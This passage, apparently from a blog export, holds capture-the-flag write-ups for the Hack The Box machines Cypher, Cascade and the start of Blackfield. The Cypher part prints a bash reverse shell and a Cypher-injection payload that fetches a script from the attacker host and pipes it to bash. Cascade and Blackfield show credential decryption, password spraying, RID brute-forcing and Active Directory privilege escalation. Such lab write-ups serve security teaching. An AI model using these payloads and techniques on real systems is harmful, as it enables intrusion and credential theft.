\"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py\", line 178, in inner\n    func(*args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py\", line 860, in fetch_message\n    res = self._process_message(tag, fields)\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py\", line 370, in _process_message\n    response.on_failure(summary_metadata or {})\n  File \"/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py\", line 245, in on_failure\n    raise Neo4jError.hydrate(**metadata)\nneo4j.exceptions.ClientError: {code: Neo.ClientError.Statement.ExternalResourceFailed} {message: Invalid URL 'http://10.10.14.8/?version=5.24.1&name=Neo4j Kernel&edition=community': Illegal character in query at index 44: http://10.10.14.8/?version=5.24.1&name=Neo4j Kernel&edition=community ()}\n```\n\nLets try sending a POST with some creds and maybe an error or mispelling.\n\n![](/img/err2.png)\n\nJackPot!!! We can see what the expected expressions would be and how we should craft a payload. Lets move on for now.\n\n### Testing directory\n\n`/testing` looks interesting, once we check that out we find a directory listing with a `.jar` file.\n\n```\n$ gobuster dir -u http://cypher.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt\n\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://cypher.htb/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/login                (Status: 200) [Size: 3671]\n/index                (Status: 200) [Size: 4562]\n/api                  (Status: 307) [Size: 0] [--> /api/docs]\n/about                (Status: 200) [Size: 4986]\n/demo                 (Status: 307) [Size: 0] [--> /login]\n/.                    (Status: 200) [Size: 4562]\n/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]\n<SNIP>\n```\n\n![](/img/web.png)\n\nOnce we download the file we can unzip it like a normal `.zip` file. Lets list whats inside first. \n```\n$ unzip -l custom-apoc-extension-1.0-SNAPSHOT.jar\nArchive:  custom-apoc-extension-1.0-SNAPSHOT.jar\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n        0  2024-09-19 01:11   META-INF/\n       81  2024-09-19 01:11   META-INF/MANIFEST.MF\n        0  2024-09-19 01:11   com/\n        0  2024-09-19 01:11   com/cypher/\n        0  2024-09-19 01:11   com/cypher/neo4j/\n        0  2024-09-19 01:11   com/cypher/neo4j/apoc/\n      547  2024-09-19 01:11   com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class\n     1670  2024-09-19 01:11   com/cypher/neo4j/apoc/HelloWorldProcedure.class\n     3837  2024-09-19 01:11   com/cypher/neo4j/apoc/CustomFunctions.class\n      573  2024-09-19 01:11   com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class\n        0  2024-09-16 13:07   META-INF/maven/\n        0  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/\n        0  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/\n     1631  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml\n       79  2024-09-19 01:11   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties\n---------                     -------\n     8418                     15 files\n```\n\n### Java Debug (Source Code Analysis)\n\nNow we have some `.class` files. Usually written in java, we can look at the source code using `jd-gui`.\n\n```\n$ jd-gui CustomFunctions.class\n```\n\nThis will give us a window with our function. If we look we can see it making a system call. The `ClassFunctions` uses shell command `curl` to get the HTTP status code. It suppresses the output (-s), ensures no file saved (-o /dev/null), and sets a connection timeout (--connect-timeout 1). The `curl` command returns the HTTP status code using the `-w` flag and `{http_code}`. The primary issue lies in how the URL is passed into the shell command without sufficient validation or sanitization. This is were we can append arbritrary code.\n\n![](/img/jd-gui.png)\n\n### FootHold and Payload Creation\n\nFirst we make our shell:\n```\n# shell.sh\n/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.8/9001 0>&1\n```\nNow we have to craft a payload to try and hit our server. This should grab our payload and execute.\n```\n\"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' MATHC' return h.value as hash\nAND\nString statusCode = inputReader.readLine();\"\n```\nSo our payload might look something like this:\n```\n{\"username\":\"admin' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"cypher.htb;curl 10.10.14.8/shell.sh|bash;#\\\") YIELD statusCode AS a RETURN a; //\",\n\n\"password\":\"Password123\"}\n```\n\n*Explanation*\nUsing this in a POST Request we send the data as JSON. Though we are injecting our payload. We use `h.value` or `u.name` as our variable `a` then `UNION CALL` the function `custom.getUrlStatusCode`. Inside it we have our payload, which checks the status code of cypher.htb then curls our machine and executes our code. `YIELD` the `statusCode` as our variable `a` and return `a`.`RETURN a` will execute our code. We use `\\` to escape `\"` inside the parentheses. Then `//` at then end to comment out everything else.\n\n![](/img/shell.png)\n\n## Shell as neo4j\nLooking around we see `graphasm` in `/home`. Going into his home we find `bbot_preset.yml` which reveals credentials we can try for ssh.\n```\nneo4j@cypher:/$ cd /home/\ncd /home/\nneo4j@cypher:/home$ ls\nls\ngraphasm\nneo4j@cypher:/home$ cd *\ncd *\nneo4j@cypher:/home/graphasm$ ls\nls\nbbot_preset.yml\nuser.txt\nneo4j@cypher:/home/graphasm$ cat bbot_preset.yml\ncat bbot_preset.yml\ntargets:\n  - ecorp.htb\n\noutput_dir: /home/graphasm/bbot_scans\n\nconfig:\n  modules:\n    neo4j:\n      username: neo4j\n      password: <SNIP>\nneo4j@cypher:/home/graphasm$\n```\n## Shell as graphasm\nUsing the creds to get in via ssh we see what we can run with permissions, if any.\n```\ngraphasm@cypher:~$ sudo -l\nMatching Defaults entries for graphasm on cypher:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser graphasm may run the following commands on cypher:\n    (ALL) NOPASSWD: /usr/local/bin/bbot\n```\n\n## PrivEsc\nLooking into the man pages and seeing how we can abuse this. We have a couple of different flags we can look at.\n```\n-c = custom config\n-y = skip scan confirmation prompt\n--dry-run = abort before executing scan\n-d = debug (verbose/more info)\n```\n\nSo we can try something like this that might reveal the flag for us.\n```\ngraphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run\n\n  ______  _____   ____ _______\n |  ___ \\|  __ \\ / __ \\__   __|\n | |___) | |__) | |  | | | |\n |  ___ <|  __ <| |  | | | |\n | |___) | |__) | |__| | | |\n |______/|_____/ \\____/  |_|\n BIGHUGE BLS OSINT TOOL v2.1.0.4939rc\n\nwww.blacklanternsecurity.com/bbot\n\n[DBUG] Preset bbot_cli_main: Adding module \"json\" of type \"output\"\n[DBUG] Preset bbot_cli_main: Adding module \"stdout\" of type \"output\"\n[DBUG] Preset bbot_cli_main: Adding module \"python\" of type \"output\"\n[DBUG] Preset bbot_cli_main: Adding module \"csv\" of type \"output\"\n[DBUG] Preset bbot_cli_main: Adding module \"txt\" of type \"output\"\n[DBUG] Preset bbot_cli_main: Adding module \"aggregate\" of type \"internal\"\n[DBUG] Preset bbot_cli_main: Adding module \"dnsresolve\" of type \"internal\"\n[DBUG] Preset bbot_cli_main: Adding module \"cloudcheck\" of type \"internal\"\n[DBUG] Preset bbot_cli_main: Adding module \"excavate\" of type \"internal\"\n[DBUG] Preset bbot_cli_main: Adding module \"speculate\" of type \"internal\"\n<SNIP>\n[DBUG] internal.excavate: Including Submodule URLExtractor\n[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]\n[DBUG] internal.excavate: Final combined yara rule contents: 784fdd4e2746a92781066bdf74593aa3\n```\nThis reveals the root flag.\n\n![](/img/robocop.gif)","tags":["neo4j","java decompiler","Cypher Injection","github custom scanners"],"categories":["htb"]},{"title":"Cascade (Windows Medium)","url":"/2025/03/05/Cascade/","content":"![](/img/cascade.png)\n\nCascade is a medium Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user `r.thompson`, which gives access to a `TightVNC` registry backup. The backup is decrypted to gain the password for `s.smith`. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the `ArkSvc` account. This account belongs to the `AD Recycle Bin` group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator. \n\n## Initial Nmap\n```\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid:\n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-05 15:34:05Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n636/tcp   open  tcpwrapped    syn-ack ttl 127\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 127\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n```\n\n## LDAP\n\nChecking if Anonymous LDAP binding is enabled.\n```\n$ ldapsearch -x -H ldap://10.10.10.182 -b \"DC=cascade,DC=local\" '(objectClass=person)'\n\n<SNIP>\nname: Ryan Thompson\nobjectGUID:: LfpD6qngUkupEy9bFXBBjA==\nuserAccountControl: 66048\nbadPwdCount: 2\ncodePage: 0\ncountryCode: 0\nbadPasswordTime: 133856782280227955\nlastLogoff: 0\nlastLogon: 133856660661946343\npwdLastSet: 132230718862636251\nprimaryGroupID: 513\nobjectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==\naccountExpires: 9223372036854775807\nlogonCount: 2\nsAMAccountName: r.thompson\nsAMAccountType: 805306368\nuserPrincipalName: r.thompson@cascade.local\nobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local\ndSCorePropagationData: 20200126183918.0Z\ndSCorePropagationData: 20200119174753.0Z\ndSCorePropagationData: 20200119174719.0Z\ndSCorePropagationData: 20200119174508.0Z\ndSCorePropagationData: 16010101000000.0Z\nlastLogonTimestamp: 133856660661946343\nmsDS-SupportedEncryptionTypes: 0\ncascadeLegacyPwd: <SNIP>\n<SNIP>\n```\nThis reveals a `cascadeLegacyPwd` for `r.thompson`. We can use `base64` to decode this perhaps.\n```\n$ echo <SNIP> | base64 -d\n<SNIP>\n```\n\n## SMB\n\nWe can try `r.thompson` and the password we have to see what shares are available.\n```\n$ nxc smb 10.10.10.182 -u r.thompson -p <SNIP> --shares\n\nSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\\r.thompson:<SNIP>\nSMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares\nSMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark\nSMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------\nSMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin\nSMB         10.10.10.182    445    CASC-DC1         Audit$\nSMB         10.10.10.182    445    CASC-DC1         C$                              Default share\nSMB         10.10.10.182    445    CASC-DC1         Data            READ\nSMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC\nSMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share\nSMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers\nSMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share\n```\nGetting a mix on tools and using `smbmap` we see whats in the Data share.\n```\n$ smbmap -H 10.10.10.182 -u r.thompson -p <SNIP> -R Data\n[+] IP: 10.10.10.182:445\tName: casc-dc1\n\tDisk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tData                                              \tREAD ONLY\t\n\t.\\Data\\*\n\tdr--r--r--                0 Tue Jan 28 16:05:51 2020\t.\n\tdr--r--r--                0 Tue Jan 28 16:05:51 2020\t..\n\tdr--r--r--                0 Sun Jan 12 19:45:14 2020\tContractors\n\tdr--r--r--                0 Sun Jan 12 19:45:10 2020\tFinance\n\tdr--r--r--                0 Tue Jan 28 12:04:51 2020\tIT\n\tdr--r--r--                0 Sun Jan 12 19:45:20 2020\tProduction\n\tdr--r--r--                0 Sun Jan 12 19:45:16 2020\tTemps\n\t.\\Data\\IT\\*\n\tdr--r--r--                0 Tue Jan 28 12:04:51 2020\t.\n\tdr--r--r--                0 Tue Jan 28 12:04:51 2020\t..\n\tdr--r--r--                0 Tue Jan 28 12:00:30 2020\tEmail Archives\n\tdr--r--r--                0 Tue Jan 28 12:04:51 2020\tLogonAudit\n\tdr--r--r--                0 Tue Jan 28 18:53:04 2020\tLogs\n\tdr--r--r--                0 Tue Jan 28 16:06:59 2020\tTemp\n\t.\\Data\\IT\\Email Archives\\*\n\tdr--r--r--                0 Tue Jan 28 12:00:30 2020\t.\n\tdr--r--r--                0 Tue Jan 28 12:00:30 2020\t..\n\tfr--r--r--             2522 Tue Jan 28 12:00:30 2020\tMeeting_Notes_June_2018.html\n\t.\\Data\\IT\\Logs\\*\n\tdr--r--r--                0 Tue Jan 28 18:53:04 2020\t.\n\tdr--r--r--                0 Tue Jan 28 18:53:04 2020\t..\n\tdr--r--r--                0 Tue Jan 28 18:53:04 2020\tArk AD Recycle Bin\n\tdr--r--r--                0 Tue Jan 28 18:56:00 2020\tDCs\n\t.\\Data\\IT\\Logs\\Ark AD Recycle Bin\\*\n\tdr--r--r--                0 Tue Jan 28 18:53:04 2020\t.\n\tdr--r--r--                0 Tue Jan 28 18:53:04 2020\t..\n\tfr--r--r--             1303 Tue Jan 28 19:19:11 2020\tArkAdRecycleBin.log\n\t.\\Data\\IT\\Logs\\DCs\\*\n\tdr--r--r--                0 Tue Jan 28 18:56:00 2020\t.\n\tdr--r--r--                0 Tue Jan 28 18:56:00 2020\t..\n\tfr--r--r--             5967 Sun Jan 26 16:22:05 2020\tdcdiag.log\n\t.\\Data\\IT\\Temp\\*\n\tdr--r--r--                0 Tue Jan 28 16:06:59 2020\t.\n\tdr--r--r--                0 Tue Jan 28 16:06:59 2020\t..\n\tdr--r--r--                0 Tue Jan 28 16:06:55 2020\tr.thompson\n\tdr--r--r--                0 Tue Jan 28 14:00:05 2020\ts.smith\n\t.\\Data\\IT\\Temp\\s.smith\\*\n\tdr--r--r--                0 Tue Jan 28 14:00:05 2020\t.\n\tdr--r--r--                0 Tue Jan 28 14:00:05 2020\t..\n\tfr--r--r--             2680 Tue Jan 28 14:00:01 2020\tVNC Install.reg\n```\n\n## VNC Registry File\n\nThe `VNC Install.reg` was the only thing that held any real data we could use. After downloading it and opening it we see a password in hex for TightVNC.\n![](/img/reg.png)\n\nUsing a little trick I found on github for [VNCDecrypt](https://github.com/billchaison/VNCDecrypt), I can decrpyt this hex password.\n```\n$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv\n00000000  73 54 33 33 33 76 65 32                           |<SNIP>|\n00000008\n```\n\n## Password Spraying\n\nAfter getting this password, we try to spray the domain and came out successful.\n```\n$ nxc smb 10.10.10.182 -u users.lst -p <SNIP>\nSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\\CascGuest:<SNIP> STATUS_LOGON_FAILURE\nSMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\\arksvc:<SNIP> STATUS_LOGON_FAILURE\nSMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\\s.smith:<SNIP>\n```\nWe got a hit on `s.smith`, so we can see what else they might have access to via `SMB`.\n\n![](/img/smith.gif)\n\n## SMasHing SMB with s.smith\n\nLooking into shares we see we have access the a Audit Share.\n```\n$ smbmap -H 10.10.10.182 -u s.smith -p <SNIP>\n[+] IP: 10.10.10.182:445\tName: casc-dc1\n\tDisk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tADMIN$                                            \tNO ACCESS\tRemote Admin\n\tAudit$                                            \tREAD ONLY\t\n\tC$                                                \tNO ACCESS\tDefault share\n\tData                                              \tREAD ONLY\t\n\tIPC$                                              \tNO ACCESS\tRemote IPC\n\tNETLOGON                                          \tREAD ONLY\tLogon server share\n\tprint$                                            \tREAD ONLY\tPrinter Drivers\n\tSYSVOL                                            \tREAD ONLY\tLogon server share\n```\nLooking into this share we have a couple of files and maybe a custom `exe` file.\n```\n$ smbmap -H 10.10.10.182 -u s.smith -p <SNIP> -R 'Audit$'\n[+] IP: 10.10.10.182:445\tName: casc-dc1\n\tDisk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tAudit$                                            \tREAD ONLY\t\n\t.\\Audit$\\*\n\tdr--r--r--                0 Wed Jan 29 12:01:26 2020\t.\n\tdr--r--r--                0 Wed Jan 29 12:01:26 2020\t..\n\tfr--r--r--            13312 Tue Jan 28 15:47:08 2020\tCascAudit.exe\n\tfr--r--r--            12288 Wed Jan 29 12:01:26 2020\tCascCrypto.dll\n\tdr--r--r--                0 Tue Jan 28 15:43:18 2020\tDB\n\tfr--r--r--               45 Tue Jan 28 17:29:47 2020\tRunAudit.bat\n\tfr--r--r--           363520 Tue Jan 28 14:42:18 2020\tSystem.Data.SQLite.dll\n\tfr--r--r--           186880 Tue Jan 28 14:42:18 2020\tSystem.Data.SQLite.EF6.dll\n\tdr--r--r--                0 Tue Jan 28 14:42:18 2020\tx64\n\tdr--r--r--                0 Tue Jan 28 14:42:18 2020\tx86\n\t.\\Audit$\\DB\\*\n\tdr--r--r--                0 Tue Jan 28 15:43:18 2020\t.\n\tdr--r--r--                0 Tue Jan 28 15:43:18 2020\t..\n\tfr--r--r--            24576 Tue Jan 28 15:43:18 2020\tAudit.db\n\t.\\Audit$\\x64\\*\n\tdr--r--r--                0 Tue Jan 28 14:42:18 2020\t.\n\tdr--r--r--                0 Tue Jan 28 14:42:18 2020\t..\n\tfr--r--r--          1639936 Tue Jan 28 14:42:18 2020\tSQLite.Interop.dll\n\t.\\Audit$\\x86\\*\n\tdr--r--r--                0 Tue Jan 28 14:42:18 2020\t.\n\tdr--r--r--                0 Tue Jan 28 14:42:18 2020\t..\n\tfr--r--r--          1246720 Tue Jan 28 14:42:18 2020\tSQLite.Interop.dll\n```\n\n## Source Code Analysis\n\nWe can download `CascAudit.exe` and see what thats about. We get it to our Windows VM and open it in `dnSpy`, and look at the MainModule.\n![](/img/sqlitecasc.png)\n\nThis shows us a part of the executable that uses sqlite to create an account over LDAP, I suppose. As well as a function `Crypto` that wasn't mentioned in the code. So it must be in a `dll` on the share. Guess we'll go find more in the Audit Share. We can grab the `CascCrypto.dll` and `Audit.db` and check these out. \n```\n# Audit.db\n\n$ sqlite3 10.10.10.182-Audit_DB_Audit.db '.dump'\\\nPRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE IF NOT EXISTS \"Ldap\" (\n\t\"Id\"\tINTEGER PRIMARY KEY AUTOINCREMENT,\n\t\"uname\"\tTEXT,\n\t\"pwd\"\tTEXT,\n\t\"domain\"\tTEXT\n);\nINSERT INTO Ldap VALUES(1,'ArkSvc','<BASE64>','cascade.local');\nCREATE TABLE IF NOT EXISTS \"Misc\" (\n\t\"Id\"\tINTEGER PRIMARY KEY AUTOINCREMENT,\n<SNIP>\n```\nSo we have a hash for the user `ArkSvc`. Next we look at the `dll` we got back in `dnSpy`.\n![](/img/cipherCBC.png)\nWe have the function `Crypto` and looking it over we see were using AES. Doing some research and looking at [cipher mode CBC](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.ciphermode?view=netcore-3.1) as mention in the `dll` code (`aes.Mode = CipherMode.CBC;`),we first we need to install `pyaes` (*apt install python-pyaes*). Then use python to decrypt the password we have from the sqlite database. \n```\n$ python3\nPython 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import pyaes\n>>> from base64 import b64decode\n>>> key = b'KEY'\n>>> iv = b'IV'\n>>> aes = pyaes.AESModeOfOperationCBC(key, iv = iv)\n>>> decrypted = aes.decrypt(b64decode('<BASE64>'))\n>>> print(decrypted.decode())\n<SNIP>\n>>>\n```\nWe got the password for `arksvc`. We can check our access with `nxc`.\n```\n$ nxc winrm 10.10.10.182 -u arksvc -p <SNIP>\nWINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)\nWINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\\arksvc:<SNIP> (Pwn3d!)\n```\nLets get access and snoop around. \n\n## Shell as arksvc\n```\n$ evil-winrm -i 10.10.10.182 -u arksvc -p <SNIP>\n<SNIP>\n\n*Evil-WinRM* PS C:\\Users\\arksvc\\Documents> whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                            Attributes\n=========================================== ================ ============================================== ===============================================================\nEveryone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group\nCASCADE\\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group\nCASCADE\\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group\nCASCADE\\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group\nCASCADE\\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group\n```\n![](/img/recycle.gif)\n\nWe see were in the `AD Recycle Bin Group`, and looking online we find a [github](https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md) stating that the Group has the permissions to read deleted AD objects. We can try to see if there is anything that has been deleted.\n\n## PrivEsc\n\n```\n*Evil-WinRM* PS C:\\Users\\arksvc\\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *\n<SNIP>\naccountExpires                  : 9223372036854775807\nbadPasswordTime                 : 0\nbadPwdCount                     : 0\nCanonicalName                   : cascade.local/Deleted Objects/TempAdmin\n                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059\ncascadeLegacyPwd                : <BASE64>\nCN                              : TempAdmin\n                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059\ncodePage                        : 0\ncountryCode                     : 0\nCreated                         : 1/27/2020 3:23:08 AM\n<SNIP>\n```\nWe happen to have another `cascadeLegacyPwd` we can decode.\n```\n$ echo <BASE64>| base64 -d\n<SNIP>\n```\n\n\nSeeing as this was for the `TempAdmin`, we can try `Administrator` with this password.\n```\n$ evil-winrm -i 10.10.10.182 -u Administrator -p <SNIP>\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami;hostname\ncascade\\administrator\nCASC-DC1\n```\n![](/img/robocop.gif)","tags":["SMB",".NET","AD Recycle Bin Group","VNCDecrypt"],"categories":["htb"]},{"title":"Blackfield (Windows Hard)","url":"/2025/02/24/blackfield/","content":"![](/img/blackfield.png)\n\nBackfield is a hard Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. The user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access a SMB share containing forensics artifacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator. \n\n## Nmap\n```\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-28 22:58:26Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\n\n## SMB\n\nLooking into shares:\n```\nnxc smb blackfield.local -u Guest -p '' --shares\nSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\\Guest:\nSMB         10.10.10.192    445    DC01             [*] Enumerated shares\nSMB         10.10.10.192    445    DC01             Share           Permissions     Remark\nSMB         10.10.10.192    445    DC01             -----           -----------     ------\nSMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin\nSMB         10.10.10.192    445    DC01             C$                              Default share\nSMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.\nSMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC\nSMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share\nSMB         10.10.10.192    445    DC01             profiles$       READ\nSMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share\n```\n\nSince `Guest` was enabled, I tried getting users by rid bruteforcing. This gave us ALOT of users.\n```\n$ nxc smb blackfield.local -u Guest -p '' --rid-brute\n<SNIP>\nSMB         10.10.10.192    445    DC01             1000: BLACKFIELD\\DC01$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1101: BLACKFIELD\\DnsAdmins (SidTypeAlias)\nSMB         10.10.10.192    445    DC01             1102: BLACKFIELD\\DnsUpdateProxy (SidTypeGroup)\nSMB         10.10.10.192    445    DC01             1103: BLACKFIELD\\audit2020 (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1104: BLACKFIELD\\support (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1105: BLACKFIELD\\BLACKFIELD764430 (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1106: BLACKFIELD\\BLACKFIELD538365 (SidTypeUser)\n<SNIP>\nSMB         10.10.10.192    445    DC01             1411: BLACKFIELD\\BLACKFIELD653097 (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1412: BLACKFIELD\\BLACKFIELD438814 (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1413: BLACKFIELD\\svc_backup (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1414: BLACKFIELD\\lydericlefebvre (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1415: BLACKFIELD\\PC01$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1416: BLACKFIELD\\PC02$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1417: BLACKFIELD\\PC03$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1418: 